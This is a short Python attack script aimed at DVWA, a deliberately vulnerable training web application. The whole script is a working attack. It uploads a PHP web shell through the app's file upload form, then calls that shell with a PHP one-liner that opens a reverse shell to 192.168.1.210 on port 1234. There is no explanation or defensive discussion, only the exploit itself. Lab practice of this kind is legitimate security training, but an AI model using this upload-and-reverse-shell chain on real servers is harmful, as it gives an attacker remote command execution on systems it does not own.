#!/usr/bin/python3
import requests
import os
url = "http://dvwa/vulnerabilities/upload/index.php"
cookies ={'PHPSESSID':'p13a7eb5svau8t8mm6hovd6ou5','security':'low'}
response = requests.post(url,cookies=cookies,files={'MAX_FILE_SIZE': (None, '100000'),'uploaded':('rshell.php','<?php system($_GET[\'value\']);?>') ,'Upload': (None, 'Upload')})
print(response.text)
print()
print()
#### Now we include the file and get a reverse shell
url2 = "http://dvwa/hackable/uploads/rshell.php"
payload2 = {'value':'php -r \'$sock=fsockopen(\"192.168.1.210\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");\''}
response2 = requests.get(url2, params=payload2, cookies=cookies)
print(response2.text)
